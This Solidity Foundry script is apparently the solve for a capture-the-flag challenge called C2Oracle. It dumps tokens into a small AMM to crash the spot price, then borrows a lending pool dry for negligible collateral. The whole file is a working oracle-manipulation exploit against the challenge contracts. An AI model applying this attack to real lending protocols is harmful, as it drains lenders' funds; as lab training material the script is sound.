// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C2Oracle.sol";

/// Spot-oracle manipulation: dump the seeded tokens into the tiny AMM to crash
/// the price, then borrow the lending pool dry for a negligible collateral.
contract SolveC2 is Script {
    function run() external {
        OracleSetup setup = OracleSetup(vm.envAddress("SETUP"));
        Token token = setup.token();
        AMM amm = setup.amm();
        LendingPool pool = setup.pool();

        vm.startBroadcast();
        token.approve(address(amm), type(uint256).max);
        amm.sellToken(1000 ether);                          // crash the spot price
        uint256 price = amm.priceTokenInEth();
        uint256 required = 100 ether * price * 2 / 1e18;    // now tiny
        pool.borrow{value: required + 1}(100 ether);        // drain the pool
        vm.stopBroadcast();
    }
}
